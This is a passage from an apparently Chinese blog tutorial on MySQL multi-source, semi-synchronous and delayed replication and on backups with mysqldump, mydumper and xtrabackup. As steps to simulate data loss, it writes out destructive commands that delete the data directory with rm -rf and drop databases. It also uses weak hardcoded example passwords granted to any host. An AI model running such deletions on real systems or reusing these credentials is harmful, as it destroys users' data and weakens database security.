功能的时候，MySQL只允许能够保障事务安全，并且能够被日志记录的SQL语句被执行，像create table … select 和 create temporary table语句，以及同时更新事务表和非事务表的SQL语句或事务都不允许执行binlog有三种模式：Row、Statement 和 Mixed 。 现在，以下启动选项会影响 复制拓扑中的所有通道。 master 1 主服务器ip：192.168.224.10 master 2 主服务器ip：192.168.224.12 slave 从服务器IP：192.168.224.11 master端 gtid-mode=on # 是否开启多源同步技术 enforce-gtid-consistency=1 skip_slave_start=1 log-bin=mysql-bin server-id=1 # 指定mysql主从ID（该ID在主从集群中是唯一的） slave端 server-id=3 # 指定mysql主从ID（该ID在主从集群中是唯一的） gtid-mode = on # 是否开启多源同步技术 binlog_gtid_simple_recovery=1 enforce_gtid_consistency=1 master_info_repository=TABLE relay_log_info_repository=TABLE replicate_ignore_db=mysql skip_slave_start = 1 一、配置文件 Master1和Master2: 123456789#GTIDgtid-mode = onbinlog_gtid_simple_recovery=1enforce_gtid_consistency=1binlog_format = rowskip_slave_start = 1log-bin = mysql-binserver-id=1 # master1和master2的id不能相同 Slave: 12345678910111213#binlogbinlog_format=rowserver-id=3log-bin=mysql-bin#GTIDgtid-mode=onbinlog_gtid_simple_recovery=1enforce_gtid_consistency=1#修改MySQL存储master-info和relay-info的方式，即从文件存储改为表存储master_info_repository=TABLErelay_log_info_repository=TABLEreplicate_ignore_db=mysql #忽略mysql库的同步skip_slave_start=1 分别重启数据库 二、主库创建复制账号： 先创建用户和密码 master1 1create user 'aa1'@'%' identified with mysql_native_password by '123.Shui!!@#'; 再授权 1grant replication slave,replication client on *.* to 'aa1'@'%'; master2 123create user 'aa2'@'%' identified with mysql_native_password by '123.Shui!!@#';grant replication slave,replication client on *.* to 'aa2'@'%'; slave 测试能否连接 12mysql -u aa1 -h 192.168.224.10 -p'123.Shui!!@#'mysql -u aa2 -h 192.168.224.12 -p'123.Shui!!@#' 三：从库启动复制 12345678mysql&gt; stop slave;mysql&gt; change master to master_user='aa1',master_password='123.Shui!!@#',master_host='192.168.224.10',master_port=3306,master_auto_position=1 for channel 'Master_1';mysql&gt; change master to master_user='aa2',master_password='123.Shui!!@#',master_host='192.168.224.12',master_port=3306,master_auto_position=1 for channel 'Master_2';mysql&gt; start slave; 也可以start slave for channel ‘Master_1 ‘启动单个channel的复制。 四：查看slave状态 也可以直接show slave status for channel ‘Master_1’ \\G查看各个channel的复制状态 1show slave status for channel 'Master_1' \\G 通过查看performance_schema相关的表查看同步状态： 1select * from performance_schema.replication_connection_status\\G 五、数据同步检查： Master1建库建表并插入数据： 1234mysql&gt; create database master1;mysql&gt; use master1;mysql&gt; create table test1(id int);mysql&gt; insert into test1 values(1); Master2建库建表并插入数据： 1234mysql&gt; create database master2;mysql&gt; use master2;mysql&gt; create table test1(id int);mysql&gt; insert into test1 values(1); Slave查看数据是否同步： 1234mysql&gt; show databases;mysql&gt; select * from master1.test1;mysql&gt; select * from master2.test1; 查看从库的状态 1mysql&gt; show slave status\\G Mysql复制技术 之 半同步技术这个技术是Mysql5.5版本之后的新功能。 前面我们学到的MySQL复制技术，是叫异步技术： 异步技术的概述： 在主服务器上每执行完一条事务命令后都会写进二进制的日志，从服务器通过IO线程监控主服务器的二进制日志，每当主服务器的二进制日志发生改变，从服务器就会启动复制 异步技术的特点： 是允许主从之间的数据存在一定的延迟，对网络要求不高，这样设计的目的是基于数据库的高可用性，为了保证master不受slave的影响，并且异步复制使得master处于一种性能最优的状态 缺点： 在主从架构中使用异步技术，如果master停机，会发生刚刚已提交的事务，slave未能及时复制过来的可能。 半同步技术特点： master每操作一个事务,要等待slave应用这个事物后给master确认信号。这样master才能把操作成功执行。这样保证了主从数据的绝对一致，mysql半同步复制等待时间超时后(默认时间为10秒)，会自动转换成异步复制 下面开始配置半同步复制技术： 环境要求: ​ 搭建好 mysql主从异步复制 1、在master上安装半同步插件 安装插件之前记得需要解锁unlock tables; 1install plugin rpl_semi_sync_master soname 'semisync_master.so'; 备注：删除主服务器插件的方法 1uninstall plugin rpl_semi_sync_master; 安装成功后，会查询出以下6项参数 1show global variables like 'rpl_semi_sync%'; 123456789101112131415161718rpl_semi_sync_master_timeout #默认主等待从返回信息的超时间时间，10秒。rpl_semi_sync_master_wait_for_slave_count 该变量控制slave应答的数量，默认是1，表示master接收到几个slave应答后才commit。在多从的环境下，设置大于1可以提高数据的可靠性。rpl_semi_sync_master_wait_no_slave #是否允许每个事物的提交都要等待slave的信号,on为每一个事物都等待rpl_semi_sync_master_wait_point：该参数控制半同步复制在哪个点（提交后再等待响应还是响应后再提交）等待slave的响应，默认AFTER_SYNC（slave响应后再提交），可选值有AFTER_COMMIT（提交后再等待响应）。+-------------------------------------------+------------+| Variable_name | Value |+-------------------------------------------+------------+| rpl_semi_sync_master_enabled | OFF | #是否启用master的半同步复制| rpl_semi_sync_master_timeout | 10000 || rpl_semi_sync_master_trace_level | 32 | #监控等级，32代表的是等待| rpl_semi_sync_master_wait_for_slave_count | 1 || rpl_semi_sync_master_wait_no_slave | ON || rpl_semi_sync_master_wait_point | AFTER_SYNC |+-------------------------------------------+------------+ 2、在slave上安装插件 12install plugin rpl_semi_sync_slave soname 'semisync_slave.so'; 备注：删除从服务器插件的方法 1uninstall plugin rpl_semi_sync_slave; 从服务器安装成功后，会查询出以下 1show global variables like 'rpl_semi_sync%'; 123456+---------------------------------+-------+| Variable_name | Value |+---------------------------------+-------+| rpl_semi_sync_slave_enabled | OFF | #是否启用slave的半同步复制| rpl_semi_sync_slave_trace_level | 32 | #监控等级，32代表的是等待+---------------------------------+-------+ 3、在主服务器master开启半同步复制 1set global rpl_semi_sync_master_enabled=on; #开启命令 在master查看状态 1show global status like 'rpl_semi_sync%'; 123456789101112131415161718+--------------------------------------------+-------+| Variable_name | Value |+--------------------------------------------+-------+| Rpl_semi_sync_master_clients | 0 | #启用半同步复制的slave数量，现在是0，| Rpl_semi_sync_master_net_avg_wait_time | 0 | #master等待slave回复确认的平均等待时间。单位毫秒| Rpl_semi_sync_master_net_wait_time | 0 | #master总的等待时间。单位毫秒| Rpl_semi_sync_master_net_waits | 0 | #master等待slave回复的总的等待次数| Rpl_semi_sync_master_no_times | 0 | #master关闭半同步复制的次数| Rpl_semi_sync_master_no_tx | 0 | #master 等待超时的次数| Rpl_semi_sync_master_status | ON | #标记master现在是否是半同步复制状态| Rpl_semi_sync_master_timefunc_failures | 0 | #master调用时间（如gettimeofday())失败的次数 | Rpl_semi_sync_master_tx_avg_wait_time | 0 | #master在处理每个事务的平均等待时间| Rpl_semi_sync_master_tx_wait_time | 0 | #master在处理事物等待的总时间| Rpl_semi_sync_master_tx_waits | 0 | #master事物等待次数| Rpl_semi_sync_master_wait_pos_backtraverse | 0 | #后来的先到了，而先来的还没有到的次数| Rpl_semi_sync_master_wait_sessions | 0 | #当前有多少个session因为slave回复而造成等待| Rpl_semi_sync_master_yes_tx | 0 | #表示这次事物成功从slave返回一次确认信号+--------------------------------------------+-------+ 4、在从服务器slave开启半同步复制 123456set global rpl_semi_sync_slave_enabled=on; #开启命令stop slave IO_THREAD;start slave IO_THREAD; #重启IO 小写也可以。直接 stop slave; start slave; 也可以 在slave上查看状态 1show global status like 'rpl_semi_sync%'; 5、测试半同步： 在主服务器上往aaa.a1表里插入数据： 123456create database aaa;create table aaa.a1 (id int);insert into aaa.a1 values (3);再查看半同步状态，和前面进行对比show global status like 'rpl_semi_sync%'; 123456789101112131415161718+--------------------------------------------+-------+| Variable_name | Value |+--------------------------------------------+-------+ | Rpl_semi_sync_master_clients | 1 | #有一个从服务器启用半同步复制 | Rpl_semi_sync_master_net_avg_wait_time | 814 | #master等待slave回复确认的平均等待时间。单位毫秒 | Rpl_semi_sync_master_net_wait_time | 814 | #master总的等待时间。单位毫秒 | Rpl_semi_sync_master_net_waits | 1 | #master等待slave回复的总的等待次数 | Rpl_semi_sync_master_no_times | 0 | #master关闭半同步复制的次数 | Rpl_semi_sync_master_no_tx | 0 | #master 等待超时的次数 | Rpl_semi_sync_master_status | ON | #标记master现在是否是半同步复制状态 | Rpl_semi_sync_master_timefunc_failures | 0 | #master调用时间（如gettimeofday())失败的次数 | Rpl_semi_sync_master_tx_avg_wait_time | 4481 | #master在处理每个事务的平均等待时间 | Rpl_semi_sync_master_tx_wait_time | 13444 | #master在处理事物等待的总时间 | Rpl_semi_sync_master_tx_waits | 3 | #master事物等待次数 | Rpl_semi_sync_master_wait_pos_backtraverse | 0 | #后来的先到了，而先来的还没有到的次数 | Rpl_semi_sync_master_wait_sessions | 0 | #当前有多少个session因为slave回复而造成等待 | Rpl_semi_sync_master_yes_tx | 3 | #表示这次事物成功从slave返回一次确认信号 +--------------------------------------------+-------+ 6、模拟错误，把slave上的mysql停掉 1systemctl stop mysqld 再回到master上往aaa.a1表里插入数据。 123456insert into aaa.a1 values (4);Query OK, 1 row affected (10.18 sec)这次插入一个值需要等待10秒（默认的等待时间)insert into aaa.a1 values (5);现在自动转成了原来的异步模式（类似oracle DG里的最大性能模式) 再查看半同步的状态 1show global status like 'rpl_semi_sync%'; 123456789101112131415161718+--------------------------------------------+-------+| Variable_name | Value |+--------------------------------------------+-------+| Rpl_semi_sync_master_clients | 0 || Rpl_semi_sync_master_net_avg_wait_time | 884 || Rpl_semi_sync_master_net_wait_time | 8845 || Rpl_semi_sync_master_net_waits | 10 || Rpl_semi_sync_master_no_times | 1 | #表示同步已经停止了一次| Rpl_semi_sync_master_no_tx | 2 | #有3个同步超时的事务| Rpl_semi_sync_master_status | OFF | #表示同步状态为关闭状态| Rpl_semi_sync_master_timefunc_failures | 0 || Rpl_semi_sync_master_tx_avg_wait_time | 1093 || Rpl_semi_sync_master_tx_wait_time | 8748 || Rpl_semi_sync_master_tx_waits | 8 || Rpl_semi_sync_master_wait_pos_backtraverse | 0 || Rpl_semi_sync_master_wait_sessions | 0 || Rpl_semi_sync_master_yes_tx | 9 |+--------------------------------------------+-------+ 再次把slave启动。 1systemctl start mysqld 1show global variables like 'rpl_semi_sync%'; 123456+---------------------------------+-------+| Variable_name | Value |+---------------------------------+-------+| rpl_semi_sync_slave_enabled | OFF | #看到半同步复制已经关闭了，切换成了异步模式| rpl_semi_sync_slave_trace_level | 32 |+---------------------------------+-------+ 再执行下开启动作，才可以重新打开半同步复制模式。 123set global rpl_semi_sync_slave_enabled=on;stop slave IO_THREAD;start slave IO_THREAD; slave启起来后，查看表，发现刚才slave关闭期间的那几条数据还是会自动复制过来，数据又回到一致 思考题： 半同步技术模式： ​ 在主服务器上只要执行： 1set global rpl_semi_sync_master_enabled=on; 这条语句就能开启 在从服务器上只要执行以下3条命令能就开启 12345set global rpl_semi_sync_slave_enabled=on; stop slave IO_THREAD;start slave IO_THREAD; 一但主服务器或从服务器mysql服务停止或重启，半同步就会失效，有什么办法可以让他永久生效。 mysql的延时复制延迟的复制特点： 可自行设置复制间隔时间，可以防止主节点数据误删，查看数据库历史状态等 在MySQL 的主从复制基础上操作： 命令语法：CHANGE MASTER TO MASTER_DELAY = 30; #设置备节点延迟的时间，单位秒。 1change master to master_user='aa1',master_password='123.Shui!!@#',master_host='192.168.224.10',master_log_file='mysql-bin.000001',master_log_pos=1663,master_delay=30; 在slave从服务器上操作： 1、在slave从服务器上将slave服务停止 1stop slave; 2、配置延迟复制时间，不用重新配置，直接添加下面这个语法就可以了 1change master to master_delay=30; 3、启动slave线程 1start slave; 4、查看状态 1234show slave status\\GMaster_Info_File: mysql.slave_master_infoSQL_Delay: 30 已经将延时0秒变成了延时30秒。 5、测试，在master主服务器上插入1条数据 1insert into aaa.a1 values(6); 回到slave从服务器上查询主刚插入的数据： 1select * from aaa.a1; 主服务器插入完成后，马上回到从服务器查询是查询不到的，要等待30秒过后才可以 补充：mysql二进制日志管理查看所有二进制日志： 1、直接查看数据目录下的文件 2、使用SQL语句： 12345678show binary logs;+------------------+-----------+-----------+| Log_name | File_size | Encrypted |+------------------+-----------+-----------+| mysql-bin.000001 | 1368 | No || mysql-bin.000002 | 2792 | No |+------------------+-----------+-----------+ 二进制日志滚动： 1、每次重启MySQL都会促发一次二进制日志滚动，文件后缀名+1 2、手动滚动；可使用 flush logs语句，执行后，二进制日志将会发生一次滚动，后缀名+1 12345678910111213mysql&gt; flush logs;Query OK, 0 rows affected (0.18 sec)mysql&gt; show binary logs;+------------------+-----------+-----------+| Log_name | File_size | Encrypted |+------------------+-----------+-----------+| mysql-bin.000001 | 1368 | No || mysql-bin.000002 | 2839 | No || mysql-bin.000003 | 196 | No |+------------------+-----------+-----------+3 rows in set (0.00 sec) 二进制日志清除： 1、按文件名删除 12345678910111213 purge binary logs to 'mysql-bin.000003'; 删除000003之前的二进制日志，不包含000003 mysql&gt; show binary logs;+------------------+-----------+-----------+| Log_name | File_size | Encrypted |+------------------+-----------+-----------+| mysql-bin.000003 | 196 | No |+------------------+-----------+-----------+1 row in set (0.00 sec)就只剩下一个二进制日志了。 2、按时间段删除 12mysql&gt; purge binary logs before '2020-07-19 19:45';删除指定时间之前的二进制日志 作业题： 思考题： 假设在A上误删除一条数据，用二进制日志来恢复不太方便，因为日志里记录的是删除的操作，并没有记录这条数据具体是什么，所以你要在所有的日志里找到当初插入这条数据时的记录，这是很麻烦的。 原理理解题： 题1: mysql架构中,一主多从、双主、级联这三种的区别和优缺点 题2: 某公司mysql数据库运行了一年，现在要求搭建mysqlAB复制，检查主库后，发现它这一年没有使用二进制日志，请问如何做复制？ 题3: 在实际大数据量的数据库中，因为负载太高或者网络问题，造成主从复制时有延时，此时你是DBA，请问如何处理？ 题4: 如果一个lamp架构在深圳机房在运行，如何尽量无影响的把这个lamp迁移到惠州的机房 1，在惠州机房做一个lamp，mysql双主架构，web做rsync远程实时同步 2，把网站域名对应的IP地址A记录改成惠州的IP 3，当深圳机房服务器无连接时，就可以关闭深圳机房的服务器了","link":"/2020/08/03/mysql%E5%A4%8D%E5%88%B6%E6%8A%80%E6%9C%AF/"},{"title":"mysql备份","text":"mysql备份讲解1.1 备份的作用 论数据的重要性 1.2 如何实现备份？都有哪些方法可以实现数据的备份？ bin-log 使用二进制日志的方式进行备份，主要实现过程通过实现mysql的主从备份即可 备注：建议将bin-log实时备份至远程服务器中，以防机器故障而导致日志丢失 mysqldump mydumper Xtrabackup 1.mysqldump一、mysqldump 简介 mysqldump 是 MySQL 自带的逻辑备份工具。 它的备份原理是通过协议连接到 MySQL 数据库，将需要备份的数据查询出来，将查询出的数据转换成对应的insert 语句，当我们需要还原这些数据时，只要执行这些 insert 语句，即可将对应的数据还原。 常用参数说明： 123456789101112--version, -V 输出mysqldump版本信息并退出--help 显示帮助信息并退出--password, -p 连接数据库密码--user, -u 连接数据库的用户名--port, -P 连接数据库端口号--protocol 使用的连接协议，例如：tcp udp socketmysqldump -uroot -p -B m2 --protocol=tcp 二、备份命令 2.1 命令格式 1mysqldump [选项] 数据库名 [表名] &gt; 脚本名 或 1mysqldump [选项] --数据库名 [选项 表名] &gt; 脚本名 或 1mysqldump [选项] --all-databases [选项] &gt; 脚本名 命令格式： 1mysqldump -uroot -p -A &gt;/mysqlback/mysql_all.sql 作用： 将数据库所有内容备份至/root下，并设置文件名为mysql_all.sql 2.2 选项说明 参数名 缩写 含义 –host -h 服务器IP地址 –port -P 服务器端口号 –user -u MySQL 用户名 –pasword -p MySQL 密码 –databases -B 指定要备份的数据库 –all-databases -A 备份mysql服务器上的所有数据库 –compact 压缩模式，产生更少的输出 –comments -i 添加注释信息 –complete-insert -c 输出完成的插入语句 –lock-tables -l 备份前，锁定所有数据库表 –no-create-db/–no-create-info 禁止生成创建数据库语句 –force -f 当出现错误时仍然继续备份操作 –default-character-set 指定默认字符集 –add-locks 备份数据库表时锁定数据库表(默认开启) –where -w 导出时，在后方添加条件语句，只导出符合条件的数据 –xml -x 导出时，将数据格式转换为XML –flush-logs -F 开始导出之前刷新bin-log日志。 备注：如果一次导出多个库，将会多次刷新bin-log，只有在同时使用–lock-all-tables或者–master-data才不会出现类似情况 2.3 实例 备份所有数据库： 1mysqldump -uroot -p --all-databases &gt; /backup/mysqldump/all.db 备份指定数据库： 1mysqldump -uroot -p -B test &gt; /backup/mysqldump/test.db 备份指定数据库指定表(多个表以空格间隔) 1mysqldump -uroot -p mysql db event &gt; /backup/mysqldump/2table.db 备份指定数据库排除某些表 1mysqldump -uroot -p test --ignore-table=test.t1 --ignore-table=test.t2 &gt; /backup/mysqldump/test2.db 导出复合条件的库 1mysqldump -uroot -p -B db_name --where=&quot;user='root'&quot; 三、还原命令 3.1 系统行命令 1234mysqladmin -uroot -p create db_name mysql -uroot -p db_name &lt; /backup/mysqldump/db_name.db注：在导入备份数据库前，db_name如果没有，是需要创建的； 而且与db_name.db中数据库名是一样的才可以导入。 3.2 soure 方法 12mysql &gt; use db_namemysql &gt; source /backup/mysqldump/db_name.db 增量备份以上备份均为全备方式，如果要实现增量备份，最简单的方法是通过mysqldump配合bin-log来实现 实现原理：通过mysqldump命令中配合使用–flush-logs -F参数，每次全备后都刷新一次bin-log 在全备后新的操作都将被记录到新的bin-log中，故而实现增量备份 过程如下： 先开启 log-bin=mysql-bin server-id=1 然后重启， 第一次全备： 123456789mkdir /mybackmysql &gt; create database m2; 创建测试库mysql &gt; create table m2.a (id int(2),name char(10),sex char(1));mysql &gt; insert into m2.a values (1,'zhangsan','f'),(2,'lisi','m'); 插入两条数据mysql &gt; select * from m2.a; 第一次全备 然后有新的binlog日志了 1mysqldump -uroot -p -B m2 -F &gt;/myback/all.sql 然后再次插入数据 123mysql &gt;insert into m2.a values (3,'wangwu','f');mysql &gt; select * from m2.a; 将最新的log-bin备份 1cp /var/lib/mysql-bin.000002 /myback 删除测试库 1drop database m2; 恢复全备 1mysql -p &lt;/myback/all.sql 查看 1mysql &gt; select * from m2.a; 恢复增备 1mysqlbinlog /myback/mysql-bin.000002 |mysql -p 再次查看 1myslq -e -p select * from m2.a; 也可以直接通过备份bin-log来实现全量和增量备份，通过下列命令可以从指定位置恢复： 1、通过bin-log起始位置恢复 1mysqlbinlog --start-position=4 --stop-position=798 mysql_bin.000001|mysql -uroot -p 2、通过bin-log中记录时间恢复 1mysqlbinlog --start-datetime='2018-09-20 00:00:00' --stop-datetime='2018-09-31 12:00:00' mysql_bin.000001|mysql -uroot -p 2.mydumper备份Mydumper是一个针对MySQL和Drizzle的高性能多线程备份和恢复工具。 官网 12https://launchpad.net/mydumperhttps://github.com/maxbube/mydumper Mydumper主要特性： 轻量级C语言写的 多线程备份，备份后会生成多个备份文件 事务性和非事务性表一致的快照(适用于0.2.2以上版本) 快速的文件压缩 支持导出binlog 多线程恢复(适用于0.2.1以上版本) 以守护进程的工作方式，定时快照和连续二进制日志(适用于0.5.0以上版本) 开源 (GNU GPLv3) 1、mydumper安装安装依赖 12yum install glib2-devel mysql-devel zlib-devel glibc zlib pcre make pcre-devel openssl-devel gcc gcc-c++ cmake -y 下载源码包 123450.97版本git clone https://github.com/maxbube/mydumper.git #这个最新的编译会报错wget https://launchpad.net/mydumper/0.9/0.9.1/+download/mydumper-0.9.1.tar.gz# 这个需要先解压。编译过程都一样。 开始编译安装 1234567891011121314cd mydumper/mkdir bin cd bin/开始编译pwd/root/mydumper/bincmake ../make &amp;&amp; make install ls ./#安装完成后生成两个二进制文件mydumper和myloader位于/usr/local/bin目录下 在当前目录看到这两个文件就表示搞定了，创建软连接或者设置环境变量 2.1、mydumper常用参数说明1234567891011121314151617181920212223242526272829303132-B, --database 要备份的数据库，不指定则备份所有库-T, --tables-list 需要备份的表，名字用逗号隔开-o, --outputdir 备份文件输出的目录-s, --statement-size 生成的insert语句的字节数，默认1000000-r, --rows 将表按行分块时，指定的块行数，指定这个选项会关闭 --chunk-filesize-F, --chunk-filesize 将表按大小分块时，指定的块大小，单位是 MB-c, --compress 压缩输出文件-e, --build-empty-files 如果表数据是空，还是产生一个空文件（默认无数据则只有表结构文件）-x, --regex 是同正则表达式匹配 'db.table'-i, --ignore-engines 忽略的存储引擎，用都厚分割-m, --no-schemas 不备份表结构-k, --no-locks 不使用临时共享只读锁，使用这个选项会造成数据不一致--less-locking 减少对InnoDB表的锁施加时间（这种模式的机制下文详解）-l, --long-query-guard 设定阻塞备份的长查询超时时间，单位是秒，默认是60秒（超时后默认mydumper将会退出）--kill-long-queries 杀掉长查询 (不退出)-b, --binlogs 导出binlog-D, --daemon 启用守护进程模式，守护进程模式以某个间隔不间断对数据库进行备份-I, --snapshot-interval dump快照间隔时间，默认60s，需要在daemon模式下-L, --logfile 使用的日志文件名(mydumper所产生的日志), 默认使用标准输出--tz-utc 跨时区是使用的选项，不解释了--skip-tz-utc 同上--use-savepoints 使用savepoints来减少采集metadata所造成的锁时间，需要 SUPER 权限--success-on-1146 Not increment error count and Warning instead of Critical in case of table doesn't exist-h, --host 连接的主机名-u, --user 备份所使用的用户-p, --password 密码-P, --port 端口-S, --socket 使用socket通信时的socket文件-t, --threads 开启的备份线程数，默认是4-C, --compress-protocol 压缩与mysql通信的数据-V, --version 显示版本号-v, --verbose 输出信息模式, 0 = silent, 1 = errors, 2 = warnings, 3 = info, 默认为 2 注意：该命令**-u** 选项和后面的用户名必须有一个以上空格，否则将会报错 2.2 myloader 参数解释1234567891011121314-d, --directory 备份文件的文件夹-q, --queries-per-transaction 每次事物执行的查询数量，默认是1000-o, --overwrite-tables 如果要恢复的表存在，则先drop掉该表，使用该参数，需要备份时候要备份表结构-B, --database 需要还原的数据库-e, --enable-binlog 启用还原数据的二进制日志-h, --host 主机-u, --user 还原的用户-p, --password 密码-P, --port 端口-S, --socket socket文件-t, --threads 还原所使用的线程数，默认是4-C, --compress-protocol 压缩协议-V, --version 显示版本-v, --verbose 输出模式, 0 = silent, 1 = errors, 2 = warnings, 3 = info, 默认为2 备份 yichen 库 到 /data/backup/mysql 文件夹中 12345678 mydumper -u root -p '123.Shui!!' -P 3306 -h 127.0.0.1 -B yichen -o /data/backup/mysql/ tree /data/backup/mysql//data/backup/mysql/├── fan-schema-create.sql├── fan.user-schema.sql├── fan.user.sql└── metadata 从上面可以可以看出 备份所生成的文件目录中包含一个metadata文件 记录了备份数据库在备份时间点的二进制日志文件名，日志的写入位置， 如果是在从库进行备份，还会记录备份时同步至主库的二进制日志文件及写入位置每个表有两个备份文件： database.table-schema.sql 表结构文件 database.table.sql 表数据文件 恢复 beta 库 12345678910# 删除 beta 库mysql&gt; drop database yichen;# myloader 恢复myloader -u root -p '123.Shui!!' -h 127.0.0.1 -B yichen -d /data/backup/mysql/# 验证mysql -p -e 'show databases;'已经恢复了。 备份原理1、主线程 FLUSH TABLES WITH READ LOCK, 施加全局只读锁，保证数据的一致性2、读取当前时间点的二进制日志文件名和日志写入的位置并记录在metadata文件中，以供即使点恢复使用3、N个（线程数可以指定，默认是4）dump线程把事务隔离级别改为可重复读 并开启读一致的事物4、dump non-InnoDB tables, 首先导出非事物引擎的表5、主线程 UNLOCK TABLES 非事物引擎备份完后，释放全局只读锁6、dump InnoDB tables, 基于事物导出InnoDB表7、事物结束 3.xtrabackup 备份恢复 MySQL冷备、mysqldump、MySQL热拷贝都无法实现对数据库进行增量备份。在实际生产环境中增量备份是非常实用的，如果数据大于50G或100G，存储空间足够的情况下，可以每天进行完整备份，如果每天产生的数据量较大，需要定制数据备份策略。例如每周实用完整备份，周一到周六实用增量备份。而Percona-Xtrabackup就是为了实现增量备份而出现的一款主流备份工具，xtrabackup有2个工具，分别是xtrabakup、innobakupe。8.0只有xtrabkup了。 Percona-xtrabackup是 Percona公司开发的一个用于MySQL数据库物理热备的备份工具，支持MySQL、Percona server和MariaDB，开源免费，是目前较为受欢迎的主流备份工具。xtrabackup只能备份innoDB和xtraDB两种数据引擎的表，而不能备份MyISAM数据表。 xtrabackup和innobackupex两者间的区别： xtrabackup可以对innodb表进行热备份（不对表加锁，备份期间数据可读写），但不能对myisam表进行备份； innobackupex可以同时对上面两者进行备份，但针对myisam表依旧不能进行热备份（必须加锁后方能备份） 重要 版本8.0.6中添加了对MyRocks存储引擎的支持。 Percona XtraBackup 8.0不支持TokuDB存储引擎。 二、Xtrabackup优点 （1）备份速度快，物理备份可靠 （2）备份过程不会打断正在执行的事务（无需锁表） （3）能够基于压缩等功能节约磁盘空间和流量 （4）自动备份校验 （5）还原速度快 （6）可以流传将备份传输到另外一台机器上 （7）在不增加服务器负载的情况备份数据 官方文档 1https://www.percona.com/doc/percona-xtrabackup/8.0/index.html 下载地址(mysql8.0之前的最好下载2.4的版本。) 2.4的安装 1234567891011cd /root/ &amp;&amp; wget https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.4/binary/tarball/percona-xtrabackup-2.4.4-Linux-x86_64.tar.gz tar zxf percona-xtrabackup-2.4.4-Linux-x86_64.tar.gz cd percona-xtrabackup-2.4.4-Linux-x86_64/ &amp;&amp; cp bin/* /usr/bin/ yum -y install perl-DBI perl-DBD-MySQL perl-Time-HiRes perl-IO-Socket-SSL perl-TermReadKey.x86_64 perl-Digest-MD5 cd /root/ &amp;&amp; wget https://www.percona.com/downloads/percona-toolkit/2.2.19/RPM/percona-toolkit-2.2.19-1.noarch.rpm rpm -vih percona-toolkit-2.2.19-1.noarch.rpm 8.0的安装 123https://www.percona.com/downloads/Percona-XtraBackup-LATEST/wget https://www.percona.com/downloads/Percona-XtraBackup-LATEST/Percona-XtraBackup-8.0.13/binary/tarball/percona-xtrabackup-8.0.13-Linux-x86_64.el8.libgcrypt183.tar.gz 安装依赖 12yum install libaio libaio-devel -y yum install -y perl-DBI perl-DBD-MySQL perl-Time-HiRes perl-IO-Socket-SSL perl-TermReadKey.x86_64 perl-Digest-MD5 可以通过yum源来安装 1yum install https://repo.percona.com/yum/percona-release-latest.noarch.rpm 启用存储库： percona-release enable-only tools release 如果打算将Percona XtraBackup与上游MySQL Server结合使用，则只需启用tools 存储库：。percona-release enable-only tools 通过运行以下命令安装Percona XtraBackup： yum install percona-xtrabackup-80 警告 在CentOS 6上libev安装Percona XtraBackup之前，请确保已安装软件包。对于此操作系统，libev可从EPEL存储库中获得该 软件包。 为了能够进行压缩备份，请安装qpress软件包： 1yum install qpress 1.Xtrabackup 常用参数12345678910111213141516171819202122232425262728-H, --host=name 该选项表示备份数据库的地址默认是本地--user： 该选项表示备份账号-p, --password： 该选项表示备份的密码-P, --port 指定端口--databases 指定数据库--incremental 创建增量备份--defaults-file 指定mysql主配置文件路径，备份参数会从配置文件中自动读取（datadir basedir等） --defaults-extra-file 使用该参数时，不只是读取主配置文件，还会读取这里指定的配置文件 --target-dir 指定备份存放路径，如不指定，则备份到当前目录下的xtrabackup_backupfiles目录 --backup 备份到--target-dir指定路径（必选），如不选则不备份，只打印过程 --prepare 实施对备份文件进行恢复前的准备(生成InnoDB log file) --print-param 打印备份或恢复时需要的参数 --suspend-at-end 在备份目录中生成一个xtrabackup_suspended文件，将xtrabackup进程挂起，不停地将数据文件的变化同步到备份文件，直到用户手工删除xtrabackup_suspended文件 --tables 备份指定的表--tables=table_name --datadir MySQL数据目录路径，一般不用指定 --incremental-basedir 该选项指定为前一次全备份或增量备份的目录，与--incremental同时使用 --incremental-lsn 增量备份时，指定to_lsn位置 xtarbackup备份命令格式： 备份： Xtrabackup全备123456xtrabackup --defaults-file=/etc/my.cnf --backup --target-dir=/data/backup/mysql/ -uroot --port=3306 -S /usr/local/mysql/data/mysql.sock -p'123.Shui!!' 将数据库全备至/data/backup/mysql/目录可以不指定-S 默认会去my.cnf文件找。xtrabackup --defaults-file=/etc/my.cnf --backup --target-dir=/data/backup/mysql/ -u root -P 3306 -p'123.Shui!!' 备份好会生成相关文件 全备完成 各文件说明： (1)xtrabackup_checkpoints 备份类型（如完全或增量）、备份状态（如是否已经为 prepared 状态）和 LSN(日志序列号)范围信息； 每个 InnoDB 页(通常为 16k 大小)都会包含一个日志序列号，即 LSN。LSN 是整个数据库 系统的系统版本号，每个页面相关的 LSN 能够表明此页面最近是如何发生改变的。 (2)xtrabackup_binlog_info mysql 服务器当前正在使用的二进制日志文件及至备份 这一刻为止二进制日志事件的位置。 (3) xtrabackup_binlog_pos_innodb 二进制日志文件及用于InnoDB或XtraDB表的二进 制日志文件的当前 position。 (4) xtrabackup_binary 备份中用到的 xtrabackup 的可执行文件； (5)backup-my.cnf 备份命令用到的配置选项信息； 在使用 innobackupex 进行备份时，还可以使用–no-timestamp 选项来阻止命令自动创建 一个以时间命名的目录；如此一来，innobackupex 命令将会创建一个 BACKUP-DIR 目录 来存储备份数据 注意：相关选项说明： 其中， –user 指定连接数据库的用户名， –password 指定连接数据库的密码， –defaults-file 指定数据库的配置文件，innobackupex 要从其中获取 datadir 等信息；–database 指定要 备份的数据库，这里指定的数据库只对 MyISAM 表有效，对于 InnoDB 数据来说都是全 备（所有数据库中的 InnoDB 数据都进行了备份，不是只备份指定的数据库，恢复时也 一样）；/opt/mysqlbackup/full 是备份文件的存放位置。 注意：备份数据库的用户需要具有相应权限，如果要使用一个最小权限的用户进行备份， 则可基于如下命令创建此类用户： 1234create user 'bkpuser'@'localhost' identified mysql_native_password by '123.shui!!@#';grant reload,lock tables,replication client, process on *.* to 'bkpuser'@'localhost';flush privileges; 全备恢复 模拟数据丢失环境 停止 123systemctl stop mysqldrm /usr/local/mysql/data/* -rf 如果尝试使用这些数据文件启动InnoDB，它将检测到损坏并停止工作，以避免在损坏的数据上运行。该--prepare步骤可以使文件在单个时刻完美地保持一致，因此您可以在文件上运行 InnoDB。 该准备步骤使用这种“嵌入式InnoDB的”对复制的数据文件执行崩溃恢复，使用复制的日志文件。该prepare步骤的使用非常简单：您只需使用选项运行xtrabackup--prepare并告诉它要准备的目录，例如，准备先前进行的备份运行： 恢复前准备（初始化备份目录） 1xtrabackup --prepare --target-dir=/data/backup/mysql/ 恢复备份 警告 